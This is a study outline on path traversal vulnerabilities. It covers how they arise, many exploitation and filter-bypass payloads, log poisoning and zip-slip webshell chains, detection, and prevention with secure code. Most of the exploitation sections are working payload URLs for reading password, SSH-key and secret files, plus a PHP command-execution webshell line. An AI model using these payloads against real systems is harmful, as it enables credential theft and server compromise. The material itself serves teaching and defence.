## Path Traversal (Directory Traversal)

- **What it is**
  - A vulnerability that allows attackers to access files and directories stored outside the intended directory
  - Also known as directory traversal
  - Enables reading of arbitrary files on the server
  - In some cases, allows writing to files (leading to code execution)
  - Exploits insufficient validation of user-supplied input used in file operations
  - Common in applications that expose file system functionality (image loading, file downloads, etc.)
  - Can lead to disclosure of sensitive information or complete system compromise

- **Impact of path traversal**
  - **Sensitive information exposure**
    - Access to application source code and configuration files
    - Database connection strings and credentials
    - User account credentials (e.g., /etc/passwd, /etc/shadow)
    - Configuration files containing API keys or secrets
    - SSH keys and other authentication material
  
  - **Application compromise**
    - Code disclosure leading to other vulnerabilities
    - Access to internal APIs and architecture
    - Full application source code disclosure

  - **Server compromise**
    - Access to system files and configurations
    - Potentially write access leading to webshell upload
    - Lateral movement through the system
    - Escalation to full server control

- **How vulnerabilities arise**
  - **Direct file inclusion**
    - User-controlled input passed directly to file system functions
    - Example (PHP):
      ```php
      $file = $_GET['filename'];
      include('/var/www/images/' . $file);
      ```
  
  - **File download/display functionality**
    - File download features with insufficient path validation
    - Document retrieval systems
    - Image loading features
    - Example URL: `/loadImage?filename=image.jpg`
  
  - **File upload destinations**
    - Upload functions that allow specifying directories
    - Example URL: `/upload?directory=uploads`
  
  - **Static resource access**
    - Access to CSS, JavaScript, images with path parameters
    - Example URL: `/resources?file=styles.css`
  
  - **Import/include functionality**
    - Functions that dynamically include files
    - Example (PHP): `include($_GET['module'] . '.php');`

- **Exploiting path traversal**
  
  - **Basic path traversal techniques**
    
    - **Directory traversal sequences**
      - Unix/Linux: `../` (moves up one directory)
      - Windows: `../` or `..\` (both work on Windows)
      - Examples:
        - `/loadImage?filename=../../../etc/passwd`
        - `/loadImage?filename=..\..\..\windows\win.ini`
    
    - **Targeting common sensitive files**
      - Unix/Linux targets:
        - `/etc/passwd` - User account information
        - `/etc/shadow` - Encrypted passwords (requires privileges)
        - `/etc/hosts` - Host file mappings
        - `/proc/self/environ` - Environment variables that may contain secrets
        - `/var/www/html/index.php` - Web application source code
        - `/var/www/html/config.php` - Application configuration
        - `~/.ssh/id_rsa` - SSH private keys
        - `/var/log/apache2/access.log` - Web server logs
      - Windows targets:
        - `C:\Windows\win.ini` - Legacy Windows configuration
        - `C:\Windows\system32\drivers\etc\hosts` - Host file mappings
        - `C:\inetpub\wwwroot\web.config` - Web application configuration
        - `C:\Users\Administrator\Desktop\passwords.txt` - Possible sensitive files
        - `C:\Program Files\MySQL\MySQL Server X.Y\my.ini` - Database configuration
        - `C:\xampp\htdocs\index.php` - Web application source code
    
    - **Using absolute paths**
      - Direct reference without traversal:
        - `/loadImage?filename=/etc/passwd`
        - `/loadImage?filename=C:\Windows\win.ini`
  
  - **Identifying path traversal vulnerabilities**
    
    - **Testing for basic traversal**
      - Add `../` sequences to parameters that likely reference files
      - Start with a single `../` and gradually increase
      - Example: `/loadImage?filename=../test.jpg`
    
    - **Monitoring responses**
      - Check for different response lengths
      - Look for error messages that reveal file paths
      - Analyze response content for file data
      - Watch for changes in content-type headers
    
    - **Identifying entry points**
      - File download functions
      - Image/media loading
      - Include/require functionality
      - Import features
      - Template loading

- **Bypassing common path traversal defenses**
  
  - **Bypassing blacklist filters**
    
    - **Using absolute paths**
      - When traversal sequences are blocked:
        - `/loadImage?filename=/etc/passwd`
        - `/loadImage?filename=C:\boot.ini`
    
    - **Nested traversal sequences**
      - When simple traversal sequences are filtered:
        - `....//` (becomes `../` when inner `../` is removed)
        - `....\/` (mixed encoding)
        - `.....///` (nested with multiple separators)
      - Example: `/loadImage?filename=....//....//....//etc/passwd`
    
    - **URL encoding variations**
      - Single URL encoding:
        - `../` becomes `%2e%2e%2f`
        - `..\` becomes `%2e%2e%5c`
      - Double URL encoding:
        - `../` becomes `%252e%252e%252f`
        - `..\` becomes `%252e%252e%255c`
      - Example: `/loadImage?filename=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`
    
    - **Alternative encodings**
      - Unicode/UTF-8 variants:
        - `../` as `..%c0%af`
        - `../` as `..%ef%bc%8f`
        - `..\` as `..%c1%9c`
      - Example: `/loadImage?filename=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd`
    
    - **Path normalization differences**
      - Using redundant path components:
        - `/./` (current directory)
        - `/.//` (multiple separators)
        - `/blah/../` (self-canceling directory)
      - Example: `/loadImage?filename=./.././.././../etc/passwd`
  
  - **Bypassing directory restrictions**
    
    - **Required base folder prefixes**
      - When application requires a specific starting path:
        - `/var/www/images/../../../etc/passwd`
        - `C:\inetpub\wwwroot\..\..\..\Windows\win.ini`
      - Example: `/loadImage?filename=/var/www/images/../../../etc/passwd`
    
    - **Required file extensions**
      - Using null byte injection (works in older implementations):
        - `../../../etc/passwd%00.jpg`
        - `../../../etc/passwd\0.jpg`
      - Using path truncation (platform dependent):
        - Long filenames that exceed max path length
        - `../../../etc/passwd..............................jpg`
      - Example: `/loadImage?filename=../../../etc/passwd%00.jpg`
    
    - **Working with limited character sets**
      - When only alphanumeric characters are allowed:
        - Use of environment variables: `$HOME`, `%SYSTEMROOT%`
        - Using wildcards: `/???/?tc/??ss??` (matching `/etc/passwd`)
      - Example: Using alternative paths like `/proc/self/cmdline`
  
  - **Other bypass techniques**
    
    - **Handling backslash conversions**
      - Using forward/backslash mixing:
        - `/loadImage?filename=..\/..\/..\/etc/passwd`
      - Testing both slash types:
        - `/loadImage?filename=..\..\..\windows\win.ini`
    
    - **Case sensitivity issues**
      - Testing mixed-case paths:
        - `/etc/PASSWD`
        - `/ETC/passwd`
        - `c:\WINDOWS\win.ini`
      - Example: `/loadImage?filename=../../../ETC/PASSwd`
    
    - **Path truncation**
      - Using extremely long paths that get truncated:
        - `/loadImage?filename=../../../etc/passwd/././././.[... many more characters]`
    
    - **Filter evasion with traversal variations**
      - Using forward slashes on Windows:
        - `/loadImage?filename=../../../../../windows/win.ini`
      - Using backslashes on Unix (often interpreted as escape characters):
        - `/loadImage?filename=..\\\\..\\\\..\\\\/etc/passwd`

- **Advanced path traversal techniques**
  
  - **Exploiting path traversal for file writes**
    
    - **Upload functionality**
      - Exploiting file upload paths:
        - `/upload?directory=../../../var/www/html`
      - Example: Uploading webshells to executable directories
    
    - **Log poisoning combined with traversal**
      - Injecting code into logs, then accessing via traversal:
        - Inject PHP code via User-Agent: `<?php system($_GET['cmd']); ?>`
        - Access log via traversal: `/loadImage?filename=../../../var/log/apache2/access.log`
        - Execute commands: `/loadImage?filename=../../../var/log/apache2/access.log&cmd=id`
    
    - **Zip file extraction**
      - Creating zip files with traversal paths in filenames:
        - Zip entry: `../../../var/www/html/shell.php`
        - Contents: `<?php system($_GET['cmd']); ?>`
  
  - **Platform-specific techniques**
    
    - **Windows-specific techniques**
      - Using alternate data streams:
        - `/loadImage?filename=../../../Windows/win.ini:$DATA`
      - Short filename (8.3) notation:
        - `/loadImage?filename=../../../PROGRA~1/MICROS~1/OFFICE~1/WINWORD.EXE`
      - Using reserved device names:
        - `/loadImage?filename=../../../Windows/win.ini..\CON\`
    
    - **Linux/Unix-specific techniques**
      - Using `/proc` virtual filesystem:
        - `/loadImage?filename=../../../proc/self/environ`
        - `/loadImage?filename=../../../proc/self/cmdline`
        - `/loadImage?filename=../../../proc/self/fd/0`
      - Using symbolic links:
        - `/loadImage?filename=../../../etc/alternatives/java`
    
    - **Using special device files**
      - Reading memory or hardware info:
        - `/loadImage?filename=../../../dev/mem`
      - Reading null or random devices:
        - `/loadImage?filename=../../../dev/random`

- **Real-world exploitation scenarios**
  
  - **Web applications**
    - Exploiting file inclusion in PHP apps:
      - `/index.php?page=../../../etc/passwd`
    - Extracting source code:
      - `/download.php?file=../../../var/www/html/config.php`
    - Accessing hidden API endpoints:
      - `/api/getFile?path=../../../app/controllers/AdminController.php`
  
  - **Web servers**
    - Accessing web server configuration:
      - `/loadImage?filename=../../../etc/apache2/apache2.conf`
      - `/loadImage?filename=../../../etc/nginx/nginx.conf`
    - Reading web server logs:
      - `/loadImage?filename=../../../var/log/nginx/access.log`
  
  - **Application frameworks**
    - Accessing framework configuration:
      - `/loadImage?filename=../../../var/www/html/app/config/database.yml`
    - Reading framework routing files:
      - `/loadImage?filename=../../../var/www/html/app/routes.php`
  
  - **Containerized environments**
    - Escaping from Docker containers:
      - Accessing host files via volume mounts
      - Reading container secrets:
        - `/loadImage?filename=../../../run/secrets/db_password`

- **Detecting path traversal vulnerabilities**
  
  - **Manual testing techniques**
    - Testing parameters for file references
    - Analyzing URL patterns for file operations
    - Testing both GET and POST parameters
    - Examining file upload functionality
  
  - **Automated scanning**
    - Using Burp Suite Professional's scanner
    - OWASP ZAP active scanner
    - Custom wordlists for path traversal sequences
  
  - **Code review techniques**
    - Looking for file system operations
    - Identifying user-controlled input to file functions
    - Checking for proper input validation
    - Example danger functions:
      - PHP: `include()`, `require()`, `file_get_contents()`, `fopen()`
      - Java: `new File()`, `FileInputStream()`
      - Python: `open()`, `os.path` functions

- **Prevention and mitigation**
  
  - **Input validation**
    - Implement strict input validation:
      - Whitelist allowed values rather than blacklisting bad ones
      - Validate for expected patterns (e.g., alphanumeric only)
      - Reject inputs containing path traversal sequences
    - Example (Java):
      ```java
      if (!filename.matches("^[a-zA-Z0-9]+\\.(png|jpg|gif)$")) {
          throw new ValidationException("Invalid filename");
      }
      ```
  
  - **Secure programming practices**
    - Avoid passing user input to file system APIs
    - Use secure file handling libraries:
      - PHP: `basename()` to extract filename
      - Java: `getCanonicalPath()` to resolve relative paths
    - Example (PHP):
      ```php
      $filename = basename($_GET['filename']);
      $path = '/var/www/images/' . $filename;
      ```
  
  - **Path canonicalization**
    - Resolve paths to canonical form before use
    - Verify that the final path is within allowed directories
    - Example (Java):
      ```java
      File file = new File(BASE_DIRECTORY, userInput);
      if (!file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {
          throw new SecurityException("Invalid file path");
      }
      ```
  
  - **Access controls**
    - Run application with minimal required privileges
    - Use proper file permissions
    - Implement proper user authorization
    - Use chroot jails or containers to isolate applications
  
  - **Architecture improvements**
    - Store sensitive files outside web root
    - Use database references instead of direct file paths
    - Use content delivery APIs instead of direct file access
    - Example: Using database mapping:
      ```php
      // Instead of
      readfile("/var/www/images/" . $_GET['filename']);
      
      // Use
      $stmt = $pdo->prepare("SELECT data FROM images WHERE id = ?");
      $stmt->execute([$_GET['id']]);
      $imageData = $stmt->fetchColumn();
      ```
